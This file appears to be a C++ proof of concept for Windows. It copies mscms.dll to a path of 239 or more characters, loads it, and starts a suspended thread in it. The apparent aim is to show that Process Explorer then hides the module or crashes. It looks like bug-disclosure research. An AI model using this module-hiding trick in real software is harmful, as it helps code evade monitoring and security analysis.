// ProcessExplorerCrash.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "stdio.h"


//If full dll name 239 bytes is or longer, process explorer will not show it in Module List (Ctrl + D)

//Tested on Windows 10 Pro 64-Bit
//Version	20H2
//Installed on	‎2/‎20/‎2021
//OS build	19042.928
//Experience	Windows Feature Experience Pack 120.2212.551.0
int _tmain(int argc, _TCHAR* argv[])
{
	wchar_t PathName[MAX_PATH+1]={0};
	wcscpy(PathName,L"C:\\t\\");

	if(!CreateDirectory(PathName,0))
	{
		//printf("Directory creation failed.\r\n");
		//return -1;
	}


	wchar_t SysPathName[MAX_PATH+1]={0};
	GetSystemDirectory(SysPathName,MAX_PATH);
	wcscat(SysPathName,L"\\mscms.dll");
	//wprintf(L"%s\r\n",SysPathName);

    wchar_t* pCrash = L"c:\\t\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbcccccdddddeeeeeaaaaabbbbbcccccdddddeeeeefffffaaaaabbbbbcccccddda.dll";
	CopyFile(SysPathName,pCrash,FALSE);


	wprintf(L"Now loading %s\r\n",pCrash);
	HMODULE hM = LoadLibrary(pCrash);
	printf("Loaded at: %I64X\r\n",hM);
	void* pCheckBitmapBits = GetProcAddress(hM,"CheckBitmapBits");
	printf("Function at: %I64X\r\n",pCheckBitmapBits);
	unsigned long tid = 0;
	CreateThread(0,0x1000,(LPTHREAD_START_ROUTINE)pCheckBitmapBits,0,CREATE_SUSPENDED,&tid);
	Sleep(-1);
	return 0;
}

